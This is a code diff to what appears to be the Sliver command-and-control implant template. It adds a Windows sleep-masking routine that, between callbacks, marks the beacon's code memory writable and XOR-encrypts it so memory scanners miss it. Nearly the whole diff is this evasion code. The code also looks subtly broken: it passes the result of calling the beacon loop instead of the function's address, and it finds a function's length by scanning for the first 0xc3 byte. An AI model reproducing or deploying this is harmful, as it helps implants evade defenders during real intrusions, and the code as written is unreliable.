@@ -35,6 +35,11 @@ import (
 
 	// {{if .Config.IsBeacon}}
 	"sync"
+	// {{if eq .Config.GOOS "windows" }}
+	"reflect"
+	"unsafe"
+	"golang.org/x/sys/windows"
+	// {{end}}
 	// {{end}}
 
 	// {{if .Config.Debug}}
@@ -151,6 +156,67 @@ func DllUnregisterServer() { main() }
 
 // {{end}}
 
+
+// {{if .Config.IsBeacon}}
+// {{if eq .Config.GOOS "windows" }}
+
+func encryptFunc(funcAddr uintptr, SleepTime uint32) error {
+
+	//fmt.Printf("[+] Encrypting function at address 0x%x\n", funcAddr)
+	FuncLength := findAddrLength(funcAddr)
+
+	var oldprotect uint32
+	err := windows.VirtualProtect(funcAddr, uintptr(FuncLength), windows.PAGE_EXECUTE_READWRITE, &oldprotect)
+	//fmt.Printf("[+] Changing memory permissions to the memory region from 0x%x to 0x%x\n", oldprotect, windows.PAGE_EXECUTE_READWRITE)
+	if err != nil {
+		return err
+	}
+	//generate a random byte
+	keyByte := byte(insecureRand.Intn(255))
+
+	//fmt.Println("[+] Encrypting memory region")
+	xorFunc(funcAddr, FuncLength, keyByte)
+
+	//fmt.Printf("[+] Sleeping for %d seconds\n", SleepTime)
+	time.Sleep(time.Duration(SleepTime) * time.Second)
+
+	//fmt.Println("[+] Woke up")
+	//fmt.Println("[+] Decrypting memory region")
+	xorFunc(funcAddr, FuncLength, keyByte)
+
+	//fmt.Printf("[+] Restoring memory permissions of the memory region to 0x%x\n", oldprotect)
+	err = windows.VirtualProtect(funcAddr, uintptr(FuncLength), oldprotect, &oldprotect)
+	if err != nil {
+		return err
+	}
+
+	//fmt.Println("[+] Success")
+	//Success
+	return nil
+}
+
+func findAddrLength(funcAddr uintptr) uint32 {
+	var i uint32 = 0
+	for {
+		if *(*byte)(unsafe.Pointer(funcAddr + uintptr(i))) == 0xc3 {
+			break
+		}
+		i++
+	}
+	return i
+}
+
+func xorFunc(funcAddr uintptr, funcLength uint32, key byte) { // Could be replaced with something fancy like SystemFunction032
+	for i := uint32(0); i < funcLength; i++ {
+		*(*byte)(unsafe.Pointer(funcAddr + uintptr(i))) = *(*byte)(unsafe.Pointer(funcAddr + uintptr(i))) ^ key
+	}
+
+}
+
+// {{end}}
+// {{end}}
+
+
 func main() {
 
 	// {{if .Config.Debug}}
@@ -212,7 +278,22 @@ func beaconStartup() {
 		// {{if .Config.Debug}}
 		log.Printf("Reconnect sleep: %s", reconnect)
 		// {{end}}
+		// {{if eq .Config.GOOS "windows" }}
+		//implemented sleepmask here (https://github.com/BishopFox/sliver/discussions/1171#discussioncomment-6690241)
+		//convert reconnect to uint32
+		reconnectUint32 := uint32(reconnect.Seconds())
+		err := encryptFunc(reflect.ValueOf(beaconMainLoop(beacon)).Pointer(), reconnectUint32)
+		if err != nil {
+			// uncomment below line if you want to see the error
+			//fmt.Println(err)
+			return
+		}
+		// {{if .Config.Debug}}
+		log.Printf("Encrypting function at address 0x%x", reflect.ValueOf(beaconMainLoop(beacon)).Pointer())
+		// {{end}}
+		// {{else}}
 		time.Sleep(reconnect)
+		// {{end}}
 	}
 }
 
